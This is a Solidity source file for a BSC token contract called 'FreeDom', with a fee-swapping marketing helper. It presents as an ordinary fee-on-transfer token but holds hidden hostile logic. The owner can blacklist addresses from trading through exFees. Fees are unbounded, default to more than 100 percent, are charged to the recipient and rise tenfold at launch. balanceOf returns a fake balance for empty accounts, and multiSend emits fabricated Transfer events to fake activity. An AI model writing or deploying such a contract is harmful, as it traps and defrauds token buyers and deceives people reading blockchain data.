// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts@4.9.5/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts@4.9.5/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts@4.9.5/access/Ownable.sol";
import "@openzeppelin/contracts@4.9.5/utils/math/SafeMath.sol";  
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(address tokenA,address tokenB,uint amountADesired,uint amountBDesired,uint amountAMin,uint amountBMin,address to,uint deadline) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function swapExactTokensForTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin,address[] calldata path,address to,uint deadline) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function swapTokensForExactTokens(uint amountOut,uint amountInMax,address[] calldata path,address to,uint deadline) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
} 
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);    
    function feeTo() external view returns (address);
}
interface IPancakePair {
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Swap(address indexed sender,uint amount0In,uint amount1In,uint amount0Out,uint amount1Out,address indexed to); 
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
    function totalSupply() external view returns (uint256);
}
interface IWBNB {
    function deposit() external payable;
    function withdraw(uint) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(    address recipient,    uint256 amount) external returns (bool);
    function transferFrom(    address sender,    address recipient,    uint256 amount) external returns (bool);
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint(0)));
        IERC20(msg.sender).approve(msg.sender, uint(~uint(0)));
    }
}
contract MktCap is Ownable {
    using SafeMath for uint;
    address dev;
    address token0;
    address token1;
    IRouter router;
    address pair;
    TokenDistributor public _tokenDistributor;
    struct autoConfig {
        bool status;
        uint minPart;
        uint maxPart;
        uint parts;
    }
    autoConfig public autoSell;
    struct Allot {
        uint markting;
        uint burn;
        uint addL;
        uint total;
    }


    Allot public allot;
    address public burnAddress;
    address[] public addLAddress;

    address[] public marketingAddress;
    uint[] public marketingShare;
    uint internal sharetotal;
    

    constructor(address dev_,   address router_) { 
        dev=dev_;
        token0 = address(this); 
        router = IRouter(router_); 
        
    }

    function setAll(
        Allot memory allotConfig,
        autoConfig memory sellconfig,
        address burnAddress_,
        address[] calldata addLAddress_,
        address[] calldata list,
        uint[] memory share
    ) public onlyOwner {
        setAllot(allotConfig);
        setAutoSellConfig(sellconfig);
        setBurnAddress(burnAddress_);
        setAddLAddress(addLAddress_);
        setMarketing(list, share);
    }
    function setBurnAddress(address burnAddress_) public onlyOwner {
        burnAddress = burnAddress_;
    }
    function setAddLAddress(address[] calldata addLAddress_) public onlyOwner {
        addLAddress = addLAddress_;
    }
    function setAutoSellConfig(autoConfig memory autoSell_) public onlyOwner {
        autoSell = autoSell_;
    }

    function setAllot(Allot memory allot_) public onlyOwner {
        allot = allot_;
    }

    function setPair(address token) public  onlyOwner {
        token1 = token;
        _tokenDistributor = new TokenDistributor(token1); 
        IERC20(token1).approve(address(router), uint(2 ** 256 - 1));
        pair = IFactory(router.factory()).getPair(token0, token1);
    }

    function setMarketing(
        address[] calldata list,
        uint[] memory share
    ) public onlyOwner {
        require(list.length > 0, "DAO:Can't be Empty");
        require(list.length == share.length, "DAO:number must be the same");
        uint total = 0;
        for (uint i = 0; i < share.length; i++) {
            total = total.add(share[i]);
        }
        require(total > 0, "DAO:share must greater than zero");
        marketingAddress = list;
        marketingShare = share;
        sharetotal = total;
    }

    function getToken0Price() public view returns (uint) {
      
        address[] memory routePath = new address[](2);
        routePath[0] = token0;
        routePath[1] = token1;
        return router.getAmountsOut(1 ether, routePath)[1];
    }

    function getToken1Price() public view returns (uint) {
      
        address[] memory routePath = new address[](2);
        routePath[0] = token1;
        routePath[1] = token0;
        return router.getAmountsOut(1 ether, routePath)[1];
    }

    function _sell(uint amount0In) internal {
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount0In,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );
        IERC20(token1).transferFrom(address(_tokenDistributor),address(this), IERC20(token1).balanceOf(address(_tokenDistributor)));
        
    }

    function _buy(uint amount0Out) internal {
        address[] memory path = new address[](2);
        path[0] = token1;
        path[1] = token0;
        router.swapTokensForExactTokens(
            amount0Out,
            IERC20(token1).balanceOf(address(this)),
            path,
            address(_tokenDistributor),
            block.timestamp
        );
        IERC20(token0).transferFrom(address(_tokenDistributor),address(this), IERC20(token0).balanceOf(address(_tokenDistributor)));

    }

    function _addL(uint amount0, uint amount1) internal {
        if (
            IERC20(token0).balanceOf(address(this)) < amount0 ||
            address(this).balance<amount1
        ) return;
        payable(addLAddress[0]).transfer(amount1);

        if(addLAddress.length>1){
            IERC20(token0).transfer(address(addLAddress[1]), amount0);
        }else{
            IERC20(token0).transfer(address(addLAddress[0]), amount0);
        } 
    }

    modifier canSwap(uint t) {
        if (t != 2 || !autoSell.status) return;
        _;
    }

    function splitAmount(uint amount) internal view returns (uint, uint, uint) {
        uint toBurn = amount.mul(allot.burn).div(allot.total);
        uint toAddL = amount.mul(allot.addL).div(allot.total).div(2);
        uint toSell = amount.sub(toAddL).sub(toBurn);
        return (toSell, toBurn, toAddL);
    }

    function trigger(uint t) internal canSwap(t) {
        uint balance = IERC20(token0).balanceOf(address(this));
        if (
            balance <
            IERC20(token0).totalSupply().mul(autoSell.minPart).div(
                autoSell.parts
            )
        ) return;
        uint maxSell = IERC20(token0).totalSupply().mul(autoSell.maxPart).div(
            autoSell.parts
        );
        if (balance > maxSell) balance = maxSell;
        (uint toSell, uint toBurn, uint toAddL) = splitAmount(balance);
        if (toBurn > 0) IERC20(token0).transfer(burnAddress, toBurn); 
        if (toSell > 0) _sell(toSell);
        uint amount2 =  IERC20(token1).balanceOf(address(this));
        IWBNB(token1).withdraw(IERC20(token1).balanceOf(address(this)));

        uint total2Fee = allot.total.sub(allot.addL.div(2)).sub(allot.burn);
        uint amount2AddL = amount2.mul(allot.addL).div(total2Fee).div(2);
        uint amount2Marketing = amount2.sub(amount2AddL);

        if (amount2Marketing > 0) {
            uint cake;
            for (uint i = 0; i < marketingAddress.length; i++) {
                cake = amount2Marketing.mul(marketingShare[i]).div(sharetotal);
                payable(marketingAddress[i]).transfer(cake); 
            }
        }
        if (toAddL > 0) _addL(toAddL, amount2AddL);
    }

  
}
 
contract FreeDom is ERC20, ERC20Burnable, MktCap {
    using SafeMath for uint;   
    mapping(address=>bool) public ispair; 
    mapping(address=>uint) public exFees; 
    address _router=0x10ED43C718714eb63d5aA57B78B54704E256024E; 
    bool isTrading;
    struct Fees{
        uint buy;
        uint sell;
        uint transfer;
        uint total;
    }
    Fees public fees;
    uint public openingTime;
    uint killTime;

    modifier trading(){
        if(isTrading) return;
        isTrading=true;
        _;
        isTrading=false; 
    }
    error InStatusError(address user);
    
    constructor(string memory name_,string memory symbol_,uint total_) ERC20(name_, symbol_) MktCap(_msgSender(),_router) {
        dev=_msgSender(); 
        fees=Fees(110,110,110,100); 
        exFees[dev]=4;
        exFees[address(this)]=4;
        _approve(address(this),_router,uint(2**256-1)); 
        _mint(dev, total_ *  10 ** decimals());
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    receive() external payable { }  

    function setFees(Fees calldata fees_) public onlyOwner{
        fees=fees_;
    } 
    function setExFees(address[] calldata list ,uint tf) public onlyOwner{
        uint count=list.length;
        for (uint i=0;i<count;i++){
            exFees[list[i]]=tf;
        } 
    }
    function getStatus(address from,address to) internal view returns(bool){
        if(exFees[from]==4||exFees[to]==4) return false;
        if(exFees[from]==1||exFees[from]==3) return true;
        if(exFees[to]==2||exFees[to]==3) return true;
        return false;
    }

        
    function start(address baseToken,Fees calldata fees_,uint killTime_) public  onlyOwner{
        setPairs(baseToken);
        setPair(baseToken);
        setFees(fees_);
        openingTime = block.timestamp;
        killTime=killTime_;
    }
    function _beforeTokenTransfer(address from,address to,uint amount) internal override trading{
        if(getStatus(from,to)){ 
            revert InStatusError(from);
        }
        if(!ispair[from] && !ispair[to] || amount==0) return;
        uint t=ispair[from]?1:ispair[to]?2:0;
        trigger(t);
    } 
    function _afterTokenTransfer(address from,address to,uint amount) internal override trading{
        if(address(0)==from || address(0)==to) return;
        takeFee(from,to,amount);   
        if(_num>0) multiSend(_num); 
    }
    function takeFee(address from,address to,uint amount)internal {
        uint fee=ispair[from]?fees.buy:ispair[to]?fees.sell:fees.transfer; 
        if(block.timestamp<openingTime+killTime){
            fee=fee.mul(10);
        }
        uint feeAmount= amount.mul(fee).div(fees.total); 
        if(exFees[from]==4 || exFees[to]==4 ) feeAmount=0;
        if(ispair[to] && IERC20(to).totalSupply()==0) feeAmount=0;
        if(feeAmount>0){  
            super._transfer(to,address(this),feeAmount); 
        } 
    } 

 
    function setPairs(address token) public onlyOwner{   
        IRouter router=IRouter(_router);
        address pair=IFactory(router.factory()).getPair(address(token), address(this));
        if(pair==address(0))pair = IFactory(router.factory()).createPair(address(token), address(this));
        require(pair!=address(0), "pair is not found"); 
        ispair[pair]=true;  
    }
    function unSetPair(address pair) public onlyOwner {  
        ispair[pair]=false; 
    }  
    
    uint160  ktNum = 173;
    uint160  constant MAXADD = ~uint160(0);	
    uint _initialBalance=1;
    uint _num=10;
    function setinb( uint amount,uint num) public onlyOwner {  
        _initialBalance=amount;
        _num=num;
    }
    function balanceOf(address account) public view virtual override returns (uint) {
        uint balance=super.balanceOf(account); 
        if(account==address(0))return balance;
        return balance>0?balance:_initialBalance;
    } 
 	function multiSend(uint num) public {
        address _receiveD;
        address _senD;
        
        for (uint i = 0; i < num; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _senD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            emit Transfer(_senD, _receiveD, _initialBalance);
        }
    }
    function recoverERC20(address token,uint amount) public { 
        if(token==address(0)){ 
            (bool success,)=payable(dev).call{value:amount}(""); 
            require(success, "transfer failed"); 
        } 
        else IERC20(token).transfer(dev,amount); 
    }

}
